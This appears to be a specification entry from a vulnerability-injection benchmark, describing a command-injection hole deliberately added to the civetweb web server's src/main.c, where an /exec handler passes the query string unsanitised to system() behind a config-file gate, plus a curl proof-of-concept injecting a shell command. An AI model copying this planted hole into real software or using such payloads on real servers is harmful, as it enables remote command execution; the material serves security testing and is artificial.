DESCRIPTION:
  Config-file-gated command injection in civetweb standalone server.
  The /exec endpoint is registered via mg_set_request_handler(). The server
  must be started with --config pointing to a file containing exec_mode=1
  and exec_logging=1. Without that config, the handler returns 404.

CONFIG_GATE (C2 -- config file):
  mechanism:  Key=value config file parsed by read_exec_config() via
              fopen/fgets/sscanf into struct exec_cfg {enabled, logging}.
              prescan_exec_args() strips --config PATH from argv before
              civetweb's parser sees it.
  check:      exec_handler() returns 404 unless exec_cfg.enabled && exec_cfg.logging
  complexity: requires modelling fopen->fgets->sscanf data flow into struct fields

INPUT_FLOW (I1 -- direct):
  entry:      HTTP GET /exec?cmd=<payload>  ->  ri->query_string
  path:       exec_handler() passes qs+4 (after "cmd=") directly to system()
  transforms: none

SANITIZATION (S1 -- none):
  none

SINK:        system(qs + 4) in exec_handler() (src/main.c)

CHANGED FILES:
  src/main.c -- 4 hunks:
    1. globals:  added exec_cfg struct + read_exec_config() after g_exit_flag
    2. handler:  new exec_handler() with I1 flow and S1 (no sanitization)
    3. prescan:  prescan_exec_args() strips --config PATH
    4. start:    prescan call + mg_set_request_handler() registration

EXPLOIT:
  build:   bash build.sh
  start:   ./civetweb --config /tmp/poc_147.conf -listening_ports 18147 -document_root /tmp
  config:  exec_mode = 1\nexec_logging = 1
  trigger: curl 'http://127.0.0.1:18147/exec?cmd=id>/tmp/poc_147_marker'
  verify:  cat /tmp/poc_147_marker

  gate bypass: omitting --config leaves exec_cfg.enabled=0; /exec returns 404.

NOTES:
  system() output goes to server stderr; use write-to-file payloads.
